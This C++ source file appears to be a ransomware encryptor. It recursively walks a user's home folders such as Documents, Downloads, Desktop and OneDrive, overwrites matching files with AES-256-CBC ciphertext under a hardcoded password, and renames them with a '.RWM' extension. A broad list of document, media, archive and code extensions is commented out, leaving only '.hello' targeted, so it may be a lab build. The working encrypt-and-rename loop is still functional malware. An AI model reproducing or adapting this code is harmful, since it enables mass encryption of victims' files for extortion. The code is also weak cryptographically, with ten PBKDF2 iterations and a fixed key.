#include <iostream>
#include <fstream>
#include <vector>
#include <set>
#include <cctype>
#include <cstdlib>
#include <algorithm>
#include <filesystem>
#include <string>
#include <cstring>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/kdf.h>
#include <openssl/err.h>


namespace fs = std::filesystem;

// Target file extensions (case-insensitive)
const std::set<std::string> TargetExtensions = {
    // ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".rtf", ".txt", ".odt", ".ods", ".odp", ".tex", ".log", ".csv", ".accd", ".accdb",
    // ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".psd", ".ai", ".svg", ".raw", ".cr2", ".nef",
    // ".mp3", ".wav", ".flac", ".midi", ".ogg",
    // ".avi", ".mov", ".mp4", ".mpeg", ".mpeg2", ".mpeg3", ".mpg", ".mkv", ".flv", ".3gp", ".m4v", ".wmv",
    // ".zip", ".rar", ".7z", ".tar", ".gz", ".bak", ".backup", ".wbcat",
    // ".py", ".html", ".htm", ".php", ".js", ".css", ".cpp", ".c", ".java", ".cs", ".vb", ".asp", ".aspx", ".cgi", ".pl",
    // ".sql", ".db", ".dbf", ".mdb", ".accdb", ".accd"

    ".hello"
};

// Folders to scan (relative to user home)
const std::vector<std::string> Folders = {
    "Documents",
    "Downloads",
    "Favorites",
    "Links",
    "Music",
    "Pictures",
    "Saved Games",
    "Videos",
    "OneDrive",
    "Desktop"
};

const std::string password_key = "password123";
const std::string extension = ".RWM";

// Check if file has target extension (case-insensitive)
bool checkFileExtension(const std::string& filename) {
    std::string file = filename;
    std::transform(file.begin(), file.end(), file.begin(), 
        [](unsigned char c){ return std::tolower(c); });
    
    for (const auto& ext : TargetExtensions) {
        if (file.length() >= ext.length() && 
            file.compare(file.length() - ext.length(), ext.length(), ext) == 0) {
            return true;
        }
    }
    return false;
}

// Read entire file into byte vector
std::vector<unsigned char> readFile(const std::string& path) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file) throw std::runtime_error("Cannot open file: " + path);
    
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<unsigned char> buffer(size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        throw std::runtime_error("Read failed: " + path);
    }
    return buffer;
}

// Write byte vector to file
void writeFile(const std::string& path, const std::vector<unsigned char>& data) {
    std::ofstream file(path, std::ios::binary);
    if (!file) throw std::runtime_error("Cannot create file: " + path);
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
}

// Encrypt file using AES-256-CBC with PBKDF2 key derivation
std::string encryptFile(const std::string& password, const std::string& filePath) {
    // Generate random salt and IV
    std::vector<unsigned char> salt(16);
    std::vector<unsigned char> iv(16);
    if (RAND_bytes(salt.data(), salt.size()) != 1 || 
        RAND_bytes(iv.data(), iv.size()) != 1) {
        throw std::runtime_error("Random generation failed");
    }

    // Derive key using PBKDF2
    std::vector<unsigned char> key(32);
    if (PKCS5_PBKDF2_HMAC(
        password.c_str(), password.size(),
        salt.data(), salt.size(),
        10,  // iterations
        EVP_sha1(),
        key.size(), key.data()) != 1
    ) {
        throw std::runtime_error("Key derivation failed");
    }

    // Read plaintext
    std::vector<unsigned char> plaintext = readFile(filePath);

    // Initialize encryption context
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) throw std::runtime_error("Context creation failed");
    
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key.data(), iv.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Encryption init failed");
    }

    // Encrypt with PKCS#7 padding
    std::vector<unsigned char> ciphertext(plaintext.size() + EVP_CIPHER_CTX_block_size(ctx));
    int out_len1 = 0, out_len2 = 0;
    
    if (EVP_EncryptUpdate(ctx, ciphertext.data(), &out_len1, plaintext.data(), plaintext.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Encryption update failed");
    }
    
    if (EVP_EncryptFinal_ex(ctx, ciphertext.data() + out_len1, &out_len2) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw std::runtime_error("Encryption finalize failed");
    }
    
    EVP_CIPHER_CTX_free(ctx);
    ciphertext.resize(out_len1 + out_len2);

    // Combine salt + IV + ciphertext
    std::vector<unsigned char> output;
    output.reserve(salt.size() + iv.size() + ciphertext.size());
    output.insert(output.end(), salt.begin(), salt.end());
    output.insert(output.end(), iv.begin(), iv.end());
    output.insert(output.end(), ciphertext.begin(), ciphertext.end());

    // Write encrypted data
    writeFile(filePath, output);

    // Rename with new extension
    std::string newPath = filePath + extension;
    fs::rename(filePath, newPath);
    return newPath;
}

void startEncrypting() {
    // Get user's home directory
    const char* homeDir = nullptr;
    #ifdef _WIN32
        homeDir = std::getenv("USERPROFILE");
    #else
        homeDir = std::getenv("HOME");
    #endif
    
    if (!homeDir) {
        std::cerr << "ERROR: Could not find home directory" << std::endl;
        return;
    }

    for (const auto& folder : Folders) {
        fs::path fullPath = fs::path(homeDir) / folder;
        
        if (!fs::exists(fullPath)) continue;
        
        try {
            for (const auto& entry : fs::recursive_directory_iterator(fullPath)) {
                if (!entry.is_regular_file()) continue;
                
                std::string path_str = entry.path().string();
                if (checkFileExtension(path_str)) {
                    try {
                        std::string new_path = encryptFile(password_key, path_str);
                        std::cout << "SUCCESS: File Encrypted: " << new_path << std::endl;
                    } catch (const std::exception& e) {
                        std::cerr << "ERROR: " << e.what() << " - " << path_str << std::endl;
                    }
                }
            }
        } catch (const fs::filesystem_error& e) {
            std::cerr << "WARNING: " << e.what() << std::endl;
        }
    }
}

int main() {
    // Initialize OpenSSL
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();
    
    std::cout << "---------------------------" << std::endl;
    startEncrypting();
    std::cout << "---------------------------" << std::endl;
    
    // Cleanup OpenSSL
    EVP_cleanup();
    ERR_free_strings();
    
    return 0;
}